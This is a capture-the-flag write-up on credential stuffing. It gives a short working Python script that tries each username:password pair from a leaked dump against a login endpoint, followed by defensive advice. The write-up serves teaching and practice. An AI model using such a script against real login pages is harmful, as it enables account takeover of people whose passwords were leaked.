# Credential Stuffing

**Category:** Web Exploitation

## Solution

* Found a list of username/password pairs in `creds-dump.txt`.
* Instead of testing credentials manually, I wrote a Python script to automate the login attempts.
* The script sent each credential pair to the login endpoint and checked the response for a successful login.
* The valid credentials revealed the flag.

## Script

```python
import requests

url = "http://TARGET/login"

with open("creds-dump.txt") as f:
    for line in f:
        username, password = line.strip().split(":")

        data = {
            "username": username,
            "password": password
        }

        response = requests.post(url, data=data)

        if "Invalid" not in response.text:
            print(f"[+] Valid credentials: {username}:{password}")
            print(response.text)
            break
```

## Concept

**Credential Stuffing** — Testing leaked username/password combinations against another service, relying on password reuse.

**Key Takeaway:** Automation makes repetitive credential testing efficient, while rate limiting, MFA, and unique passwords help prevent credential stuffing.

**Tools:** Python, Requests, Burp Suite
